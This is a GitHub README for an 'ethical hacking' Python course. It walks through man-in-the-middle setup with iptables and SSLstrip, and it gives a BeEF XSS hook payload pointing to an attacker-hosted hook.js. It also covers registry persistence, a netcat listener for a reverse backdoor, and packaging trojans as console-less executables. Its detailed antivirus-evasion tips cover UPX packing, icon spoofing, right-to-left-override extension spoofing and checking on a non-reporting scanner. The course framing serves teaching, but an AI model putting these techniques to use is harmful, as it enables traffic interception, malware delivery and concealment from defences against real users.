# Ethical Hacking Course
Repository for all the code related to Learn Python &amp; "Ethical Hacking From Scratch" course.  
All the work is done on Kali Linux, using both Python 2.7 and 3.x version.

## Requirements
Besides the needed libraries stated in *requirements.txt* file, BeEF framework for Kali Linux is required. Install it with the following command:  
`sudo apt-get install beef-xss`

If SSLstrip is not provided with your distribution of Kali Linux virtual machine, install it from the original source: [moxie0/sslstrip](https://github.com/moxie0/sslstrip "A tool for exploiting Moxie Marlinspike's SSL \"stripping\" attack.").

## Guidelines

### Operating system

#### Kali Linux
To enable **IP forwarding**, enter the following command into the terminal:  
`echo 1 > /proc/sys/net/ipv4/ip_forward`

To create **net filter queue** (*iptables*), enter the following command:  
`iptables -I FORWARD -j NFQUEUE --queue-num <number>`,  
where the default `<number>` is `0`.

For local testing, use both `INPUT` and `OUTPUT` chain.

To enable a basic HTTP server, type:  
`sudo service apache2 start`

#### Windows
To add an executable to Windows Registry to make the file run on the system start, the following command can be used:  
`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <name_of_reg> /t REG_SZ /d <"path_to_exe">`  

### Python
You can terminate all running python programs by typing `killall python` in the terminal.  

On Windows, while having both Python 2 and 3 installed, we can force to run either version by running:  
`py -<version> <name_of_script_file>`  
where `<version>` can be '2' or '3'.

### XSS (BeEF)
Few of the scripts use [Cross Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (XSS).
One of them does that through MIDM attack and with `code_injector.py`. The other one in `vulnerability_scanner.py`.
To put it shortly, XSS is a type of attack that injects JavaScript code into user's web browser,
used while visiting targeted web server.
There are few ways of performing such attacks and I recommend further reading to anyone interested.
Just remember that while we use scanner to find vulnerabilities, BeEF is used to exploit them.

The code we want to inject into client web browser is:  
`<script src="http://<IP>:3000/hook.js"></script>`,  
where `<IP>` is the IP of your host server containing *hook.js*.

If you are using a HTTP server, make sure insert the code snippet above
into */var/www/html/index.html*.

### SSLstrip
To use SSLstrip, use the following command to enable it in *iptables*:  
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`

This makes so that all traffic coming to port 80, which is the default port of HTTP websites,
will instead be redirected to port 10000, which is the port the SSLstrip tool uses.

In order to use packet-modifying tools together with SSLstrip, they must be configured to watch
for port 10000 instead of 80 and commands below need to be entered into Linux shell:

`iptables -I INPUT -j NFQUEUE --queue-num <number>`  
`iptables -I OUTPUT -j NFQUEUE --queue-num <number>`

### Executable files

#### Converting scripts into executables
It's important to note we focus on creating Windows executables, since for both Linux and macOS,
the problem becomes trivial, since both operating systems have Python installed by default,
therefore allowing us to directly run Python scripts.
Another problem is that on Linux, obfuscating such executable file is almost impossible - the user has to grant
"executable" permissions through chmod anyway, meaning user must be pretty techie already.
The good way to send a trojan would be to just send a Python script that the user wants,
with our malicious software at the top of it. The user *still* could just check our source code though.
On macOS however, it's easier to deal with concealing the file since there are no file extensions displayed.  
Despite all those differences between systems, pyinstaller should work on each one of them anyway.
##### On Windows
In order to package Python scripts into executable files, you need to have "pyinstaller" installed
 and you have to run the following command:  
`pyinstaller <script_name.py> --onefile --noconsole`  
* You might need to use a path to pyinstaller instead, if it's not added to PATH.  
* `--onefile` argument ensures all the required libraries and files are put into **single** executable.  
* `--noconsole` argument disables console, so when we run the program, no terminal shows up. Please note that some
Python scripts may require "stdin", "stdout" and "stderr" to be handled properly (it is handled in our program).  
* The created executable can be found in the "dist" folder.  
* To package multiple files together with the Python script (used for creating trojans), use:  
`--add-data "abs/path/to/file;."`  
This is **especially useful** when creating trojans.
The dot means the file will be stored (after running) in a default temp directory.
Can be changed to directory of preference.  

##### On Linux
If you need to create .exe file from a Linux machine (not recommended - it's better to do it natively),
you need a Python interpreter in it's Windows version. In order to do that, Wine is required
(should be installed by default on Kali Linux).  
After you've got both Python downloaded and Wine installed, type in the following command:  
`wine msiexec /i <python_installer_file>`  
* `msiexec` argument states that we are using a .msi file.  
* `/i` flag means that we want to install said file.  

After the Python installation has been completed, you can now run the interpreter in Windows version using:  
`wine python.exe -m pip install <library>` while in in `.wine/drive_c` and using `pyinstaller` as `<library>`.  
Just like on Windows, the pyinstaller can be found in `drive_c/PythonXX/Scripts` folder.  
Keep in mind that you need to have installed all the libraries your Python scripts use before you can package them.  
Similarly to Windows, in order to package the scripts, the following command needs to be typed in:  
`wine .wine/drive_c/PythonXX/Scripts/pyinstaller.exe <script_name.py> --onefile --noconsole`  
As you can see, this time we do type the whole path to `pyinstaller.exe`.  
<*I'm not sure if it's needed to, perhaps Wine can also simulate adding exe files to PATH.*>  
If you have multiple Python files used in your program, just remember to package the **main** file.
Pyinstaller will include imported libraries and files accordingly.  

#### Avoiding executables detection
To avoid detection of your .exe files by an Antivirus software, it's recommended to:  
* Use unique source code that possibly might not be yet indexed as malicious.  
* Use a behavior that will trick AV emulation of your code (i.e useless memory allocation, time delay)  

To check whether or not your program is detectable by antiviruses,
you can use services like [NoDistribute](https://nodistribute.com/ "Online virus scanner without results distribution.")
(doesn't share results with AVs' companies)
or [VirusTotal](https://www.virustotal.com/) (shares the results, thus contributing to better IT security).  
Additionally, you can compress your executables to make it even more obfuscated to antiviruses.
Use [UPX](https://github.com/upx/upx "UPX - The Ultimate Packer for eXecutables") for that purpose.  

In order to further our hiding measures, it's recommended to change the icon of our file.
Use [Iconfinder](https://www.iconfinder.com/) to find such icons
and [Easyicon](https://www.easyicon.net/language.en/covert/) to convert them appropriately.
Next, while using pyinstaller, make sure to add `--icon path\to\icon.ico` argument to package .exe with the given icon.  

Last but not least, spoofing the file extension. The trick is based on the character called "Right-to-left Override",
which changes the text orientation to start from right
(this functionality is used by few languages like Hebrew or Arabic).
You can find this character in Characters app on Kali Linux.
This trick can be used like this:  
```text
research-on-human-reflexes.exe
research-on-human-reflâ€®fdp.exe
```
Remember that such file needs to be compressed into a .zip file or similar,
since direct download will cause this character to be removed in the process.

## Tips & Tricks
* It seems that *netfilterqueue* does not work on Python 3.x.  
* To listen to incoming connections without using custom listener for reverse_backdoor.py,
you can use `nc -vv -l -p <port_number>`.  
* You can find registries associated with running programs on system startup in:  
`Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.  
* It's best to find a good, extensive list of potential subdomain names, directories and files
on the web and use it instead of creating your own that most likely won't be as effective.  
* You **should** test your crawler on your own machine (such as Metasploit),
since such action against third-party server is most likely illegal in most of the countries.
* Remember to crawl websites responsibly.
Refer to `robots.txt` file, do not throttle the server you are crawling and preferably,
ask the owner of the server for permission. It's highly recommended to use Metasploitable machine for those purposes. 
* You can modify some stuff (such as max length of message on DVWA website) by using "Inspect Element" in your browser
and changing the values as you want.  
* To change default security level of DVWA (Metasploit), edit the `/var/www/dvwa/dvwa/includes/dvwaPage.inc.php` file.
